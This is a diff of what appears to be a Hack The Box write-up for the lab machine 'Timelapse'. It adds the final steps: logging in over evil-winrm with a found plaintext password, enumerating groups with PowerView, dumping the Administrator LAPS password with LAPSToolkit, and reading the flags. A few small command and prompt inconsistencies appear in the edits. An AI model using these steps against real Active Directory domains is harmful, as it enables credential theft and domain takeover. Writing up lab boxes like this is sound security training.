@@ -1,6 +1,6 @@
 +++
 title = "Timelapse"
-date = "2024-01-01"
+date = "2024-01-06"
 description = "This is an easy Windows box."
 [extra]
 cover = "cover.png"
@@ -268,7 +268,7 @@ It found a password: `supremelegacy`!
 Let's go back to our enumeration of `winrm_backup.zip`. This time, we should be able to unzip it!
 
 ```sh
-❯ unzip /workspace/smb/Dev/winrm_backup.zip -d /workspace/
+❯ unzip /workspace/smb/Dev/winrm_backup.zip -d /workspace
 ```
 
 ```
@@ -361,12 +361,11 @@ Okay, so now we have a decrypted private key and a certificate.
 Let's use the private key and the certificate we obtained to connect to Timelapse over WinRM!
 
 ```sh
-❯ evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt
+❯ evil-winrm -i 10.10.11.152 -S -k legacyy_dev_auth.key -c legacyy_dev_auth.crt -S
 ```
 
 ```
 <SNIP>
-Enter PEM pass phrase:
 *Evil-WinRM* PS C:\Users\legacyy\Documents>
 ```
 
@@ -544,9 +543,9 @@ Users     TIMELAPSE\Domain Users S-1-5-21-671920749-559770252-3318990721-513
 
 It looks like there's only domain users.
 
-## Domain users
+## Global users
 
-Let's get the domain users then.
+Let's get the domain users then (still using `PowerView`).
 
 ```ps1
 *Evil-WinRM* PS C:\Users\legacyy\Documents> Get-DomainUser | Select-Object Name, Description, ObjectSID | Format-Table
@@ -617,6 +616,72 @@ DnsAdmins                               DNS Administrators Group
 
 Nothing extraordinary for a DC.
 
+## Global groups
+
+Let's also get the global groups with `PowerView`.
+
+```ps1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-DomainGroup | Select-Object SamAccountName, Description, ObjectSID | Format-Table
+```
+
+```
+samaccountname                      description
+--------------                      -----------
+Administrators                      Administrators have complete and unrestricted access to the computer/domain
+Users                               Users are prevented from making accidental or intentional system-wide changes and can run most applications
+Guests                              Guests have the same access as members of the Users group by default, except for the Guest account which is further restricted
+Print Operators                     Members can administer printers installed on domain controllers
+Backup Operators                    Backup Operators can override security restrictions for the sole purpose of backing up or restoring files
+Replicator                          Supports file replication in a domain
+Remote Desktop Users                Members in this group are granted the right to logon remotely
+Network Configuration Operators      Members in this group can have some administrative privileges to manage configuration of networking features
+Performance Monitor Users           Members of this group can access performance counter data locally and remotely
+Performance Log Users               Members of this group may schedule logging of performance counters, enable trace providers, and collect event traces both locally and via remote access to this computer
+Distributed COM Users               Members are allowed to launch, activate and use Distributed COM objects on this machine.
+IIS_IUSRS                           Built-in group used by Internet Information Services.
+Cryptographic Operators             Members are authorized to perform cryptographic operations.
+Event Log Readers                   Members of this group can read event logs from local machine
+Certificate Service DCOM Access      Members of this group are allowed to connect to Certification Authorities in the enterprise
+RDS Remote Access Servers           Servers in this group enable users of RemoteApp programs and personal virtual desktops access to these resources. In Internet-facing deployments, these servers are typically deployed in an edge network. This gr...
+RDS Endpoint Servers                Servers in this group run virtual machines and host sessions where users RemoteApp programs and personal virtual desktops run. This group needs to be populated on servers running RD Connection Broker. RD Sessio...
+RDS Management Servers              Servers in this group can perform routine administrative actions on servers running Remote Desktop Services. This group needs to be populated on all servers in a Remote Desktop Services deployment. The servers ...
+Hyper-V Administrators              Members of this group have complete and unrestricted access to all features of Hyper-V.
+Access Control Assistance Operators Members of this group can remotely query authorization attributes and permissions for resources on this computer.
+Remote Management Users             Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user.
+Storage Replica Administrators      Members of this group have complete and unrestricted access to all features of Storage Replica.
+Domain Computers                    All workstations and servers joined to the domain
+Domain Controllers                  All domain controllers in the domain
+Schema Admins                       Designated administrators of the schema
+Enterprise Admins                   Designated administrators of the enterprise
+Cert Publishers                     Members of this group are permitted to publish certificates to the directory
+Domain Admins                       Designated administrators of the domain
+Domain Users                        All domain users
+Domain Guests                       All domain guests
+Group Policy Creator Owners         Members in this group can modify group policy for the domain
+RAS and IAS Servers                 Servers in this group can access remote access properties of users
+Server Operators                    Members can administer domain servers
+Account Operators                   Members can administer domain user and group accounts
+Pre-Windows 2000 Compatible Access  A backward compatibility group which allows read access on all users and groups in the domain
+Incoming Forest Trust Builders      Members of this group can create incoming, one-way trusts to this forest
+Windows Authorization Access Group  Members of this group have access to the computed tokenGroupsGlobalAndUniversal attribute on User objects
+Terminal Server License Servers     Members of this group can update user accounts in Active Directory with information about license issuance, for the purpose of tracking and reporting TS Per User CAL usage
+Allowed RODC Password Replicatio... Members in this group can have their passwords replicated to all read-only domain controllers in the domain
+Denied RODC Password Replication... Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain
+Read-only Domain Controllers        Members of this group are Read-Only Domain Controllers in the domain
+Enterprise Read-only Domain Cont... Members of this group are Read-Only Domain Controllers in the enterprise
+Cloneable Domain Controllers        Members of this group that are domain controllers may be cloned.
+Protected Users                     Members of this group are afforded additional protections against authentication security threats. See http://go.microsoft.com/fwlink/?LinkId=298939 for more information.
+Key Admins                          Members of this group can perform administrative actions on key objects within the domain.
+Enterprise Key Admins               Members of this group can perform administrative actions on key objects within the forest.
+DnsAdmins                           DNS Administrators Group
+DnsUpdateProxy                      DNS clients who are permitted to perform dynamic updates on behalf of some other clients (such as DHCP servers).
+LAPS_Readers
+Development
+HelpDesk
+```
+
+The `LAPS_Readers` is not a default group for a DC... Let's keep that in mind.
+
 ## User account information
 
 Let's gather more information about us.
@@ -660,11 +725,11 @@ We don't belong to interesting groups.
 If we check our home folder, we find the user flag on our Desktop. Let's retrieve its content.
 
 ```ps1
-*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\Desktop\user.txt
+*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:USERPROFILE\Desktop\user.txt
 ```
 
 ```
-TODO
+09b4f18e47b6e817fb28617150589d73
 ```
 
 Apart from this file, there's nothing out of the ordinary.
@@ -695,3 +760,128 @@ It looks like our user connected to this machine as `svc_deploy` using the passw
 # Lateral movement (WinRM)
 
 Let's connect to Timelapse as `svc_deploy` using WinRM.
+
+```sh
+❯ evil-winrm -i 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
+```
+
+```
+<SNIP>
+Enter PEM pass phrase:
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
+```
+
+# Local enumeration
+
+## User account information
+
+Let's gather more information about us.
+
+```ps1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy
+```
+
+```
+User name                    svc_deploy
+Full Name                    svc_deploy
+Comment
+User's comment
+Country/region code          000 (System Default)
+Account active               Yes
+Account expires              Never
+
+Password last set            10/25/2021 11:12:37 AM
+Password expires             Never
+Password changeable          10/26/2021 11:12:37 AM
+Password required            Yes
+User may change password     Yes
+
+Workstations allowed         All
+Logon script
+User profile
+Home directory
+Last logon                   1/6/2024 2:26:33 PM
+
+Logon hours allowed          All
+
+Local Group Memberships      *Remote Management Use
+Global Group memberships     *LAPS_Readers         *Domain Users
+<SNIP>
+```
+
+We belong to the `LAPS_Readers` group... This likely implies that we should be able to read the LAPS password.
+
+> Microsoft LAPS is a product that manages local administrator passwords and shares permissions, storing them in Active Directory (AD). LAPS automatically randomizes and updates passwords on a routine basis, so that no two users ever have the same passwords and that passwords don’t become stale and more vulnerable to hacking.
+>
+> [Varonis](https://www.varonis.com/blog/microsoft-laps)
+
+Okay, so maybe we can retrieve the password for the local `Administrator` account?
+
+## LAPS
+
+Let's check which groups can read the LAPS passwords, this time using `LAPSToolkit`.
+
+```ps1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Find-LAPSDelegatedGroups
+```
+
+```
+OrgUnit                                    Delegated Groups
+-------                                    ----------------
+OU=Domain Controllers,DC=timelapse,DC=htb  TIMELAPSE\LAPS_Readers
+OU=Servers,DC=timelapse,DC=htb             TIMELAPSE\LAPS_Readers
+OU=Database,OU=Servers,DC=timelapse,DC=htb TIMELAPSE\LAPS_Readers
+OU=Web,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
+OU=Dev,OU=Servers,DC=timelapse,DC=htb      TIMELAPSE\LAPS_Readers
+```
+
+So we should be able to read these passwords! Let's do it.
+
+```ps1
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-LAPSComputers
+```
+
+```
+ComputerName       Password                 Expiration
+------------       --------                 ----------
+dc01.timelapse.htb oXXp1M7Tw0!9])Cr@Pk3fUHc 01/11/2024 15:22:31
+```
+
+Alright, so `Administrator`:`oXXp1M7Tw0!9])Cr@Pk3fUHc` should be valid credentials!
+
+# Privilege escalation (WinRM)
+
+Let's use these credentials to connect to Timelapse over WinRM.
+
+```sh
+❯ evil-winrm -i 10.10.11.152 -u Administrator -p 'oXXp1M7Tw0!9])Cr@Pk3fUHc' -S
+```
+
+```
+<SNIP>
+*Evil-WinRM* PS C:\Users\Administrator\Documents>
+```
+
+If we run `whoami`, we can confirm that we are `Administrator`!
+
+# Local enumeration
+
+## Home folder
+
+The only thing we need to do to finish this box is to retrieve the root flag. As usual, we can find it on our Desktop!
+
+```ps1
+*Evil-WinRM* PS C:\Users\Administrator\Documents> type $env:USERPROFILE\Desktop\root.txt
+```
+
+```
+efe365e4737611f22aae6fba4a9aab72
+```
+
+# Afterwords
+
+![Success](success.png)
+
+That's it for this box! I found it really interesting, as I discovered a few file extensions and their use cases. It was fairly easy overall, the foothold was straightforward to obtain, and the privilege escalation only required decent enumeration.
+
+Thanks for reading!
